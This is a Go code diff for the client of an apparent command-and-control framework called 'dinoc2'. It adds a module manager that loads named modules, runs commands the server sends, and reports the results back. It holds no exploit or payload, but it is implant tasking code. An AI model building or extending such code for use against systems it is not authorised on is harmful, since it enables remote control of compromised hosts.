@@ -8,6 +8,8 @@ import (
 	"time"
 
 	"dinoc2/pkg/crypto"
+	"dinoc2/pkg/module"
+	"dinoc2/pkg/module/manager"
 	"dinoc2/pkg/protocol"
 )
 
@@ -79,6 +81,9 @@ type Client struct {
 	retryCount      int
 	lastHeartbeat   time.Time
 	isActive        bool
+	moduleManager   *manager.ModuleManager
+	loadedModules   map[string]module.Module
+	moduleMutex     sync.RWMutex
 }
 
 // NewClient creates a new C2 client with the specified configuration
@@ -97,6 +102,13 @@ func NewClient(config *ClientConfig) (*Client, error) {
 
 	ctx, cancel := context.WithCancel(context.Background())
 
+	// Create module manager
+	moduleManager, err := manager.NewModuleManager()
+	if err != nil {
+		log.Printf("Warning: Failed to initialize module manager: %v", err)
+		moduleManager = nil
+	}
+
 	client := &Client{
 		config:          config,
 		protocolHandler: protocol.NewProtocolHandler(),
@@ -109,6 +121,8 @@ func NewClient(config *ClientConfig) (*Client, error) {
 		retryCount:      0,
 		lastHeartbeat:   time.Now(),
 		isActive:        false,
+		moduleManager:   moduleManager,
+		loadedModules:   make(map[string]module.Module),
 	}
 
 	// Configure protocol handler
@@ -176,6 +190,16 @@ func (c *Client) Stop() error {
 	if c.conn != nil {
 		c.conn.Close()
 		c.conn = nil
+	}
+
+	// Shutdown all modules
+	if c.moduleManager != nil {
+		errors := c.moduleManager.ShutdownAllModules()
+		if len(errors) > 0 {
+			for _, err := range errors {
+				fmt.Printf("Error shutting down module: %v\n", err)
+			}
+		}
 	}
 
 	// Update state
@@ -510,8 +534,161 @@ func (c *Client) processKeyExchange(packet *protocol.Packet) {
 
 // processModuleData processes a module data packet from the server
 func (c *Client) processModuleData(packet *protocol.Packet) {
-	// TODO: Implement module data processing
-	fmt.Printf("Received module data: %d bytes\n", len(packet.Data))
+	if c.moduleManager == nil {
+		fmt.Println("Module manager not initialized, cannot process module data")
+		return
+	}
+
+	// Parse module data
+	if len(packet.Data) < 4 {
+		fmt.Println("Invalid module data packet: too short")
+		return
+	}
+
+	// Extract module name and command
+	var moduleData struct {
+		ModuleName string          `json:"module"`
+		Command    string          `json:"command"`
+		Args       []interface{}   `json:"args"`
+		Data       []byte          `json:"data"`
+	}
+
+	err := json.Unmarshal(packet.Data, &moduleData)
+	if err != nil {
+		fmt.Printf("Failed to parse module data: %v\n", err)
+		return
+	}
+
+	// Get or load the module
+	mod, err := c.getOrLoadModule(moduleData.ModuleName)
+	if err != nil {
+		fmt.Printf("Failed to get/load module %s: %v\n", moduleData.ModuleName, err)
+		c.sendModuleErrorResponse(packet.Header.TaskID, moduleData.ModuleName, err)
+		return
+	}
+
+	// Execute the command
+	result, err := mod.Exec(moduleData.Command, moduleData.Args...)
+	if err != nil {
+		fmt.Printf("Failed to execute command %s on module %s: %v\n", 
+			moduleData.Command, moduleData.ModuleName, err)
+		c.sendModuleErrorResponse(packet.Header.TaskID, moduleData.ModuleName, err)
+		return
+	}
+
+	// Send response
+	c.sendModuleResponse(packet.Header.TaskID, moduleData.ModuleName, result)
+}
+
+// getOrLoadModule gets an existing module or loads it if not already loaded
+func (c *Client) getOrLoadModule(name string) (module.Module, error) {
+	c.moduleMutex.RLock()
+	mod, exists := c.loadedModules[name]
+	c.moduleMutex.RUnlock()
+
+	if exists {
+		return mod, nil
+	}
+
+	// Module not loaded, try to load it
+	if c.moduleManager == nil {
+		return nil, fmt.Errorf("module manager not initialized")
+	}
+
+	// Load the module using the native loader
+	mod, err := c.moduleManager.LoadModule(name, name, module.LoaderTypeNative)
+	if err != nil {
+		return nil, fmt.Errorf("failed to load module: %w", err)
+	}
+
+	// Initialize the module
+	err = c.moduleManager.InitModule(name, nil)
+	if err != nil {
+		return nil, fmt.Errorf("failed to initialize module: %w", err)
+	}
+
+	// Store the module
+	c.moduleMutex.Lock()
+	c.loadedModules[name] = mod
+	c.moduleMutex.Unlock()
+
+	return mod, nil
+}
+
+// sendModuleResponse sends a module response to the server
+func (c *Client) sendModuleResponse(taskID uint32, moduleName string, result interface{}) {
+	// Create response data
+	responseData := struct {
+		Module string      `json:"module"`
+		Result interface{} `json:"result"`
+		Status string      `json:"status"`
+	}{
+		Module: moduleName,
+		Result: result,
+		Status: "success",
+	}
+
+	// Marshal response data
+	data, err := json.Marshal(responseData)
+	if err != nil {
+		fmt.Printf("Failed to marshal module response: %v\n", err)
+		return
+	}
+
+	// Create response packet
+	response := protocol.NewPacket(protocol.PacketTypeModuleResponse, data)
+	response.SetTaskID(taskID)
+
+	// Send response
+	c.connMutex.Lock()
+	defer c.connMutex.Unlock()
+
+	if c.conn == nil {
+		return
+	}
+
+	err = c.conn.SendPacket(response)
+	if err != nil {
+		fmt.Printf("Failed to send module response: %v\n", err)
+	}
+}
+
+// sendModuleErrorResponse sends a module error response to the server
+func (c *Client) sendModuleErrorResponse(taskID uint32, moduleName string, err error) {
+	// Create error response data
+	errorData := struct {
+		Module string `json:"module"`
+		Error  string `json:"error"`
+		Status string `json:"status"`
+	}{
+		Module: moduleName,
+		Error:  err.Error(),
+		Status: "error",
+	}
+
+	// Marshal error data
+	data, err := json.Marshal(errorData)
+	if err != nil {
+		fmt.Printf("Failed to marshal module error response: %v\n", err)
+		return
+	}
+
+	// Create response packet
+	response := protocol.NewPacket(protocol.PacketTypeModuleResponse, data)
+	response.SetTaskID(taskID)
+
+	// Send response
+	c.connMutex.Lock()
+	defer c.connMutex.Unlock()
+
+	if c.conn == nil {
+		return
+	}
+
+	err = c.conn.SendPacket(response)
+	if err != nil {
+		fmt.Printf("Failed to send module error response: %v\n", err)
+	}
 }
 
 // handleConnectionFailure handles a connection failure
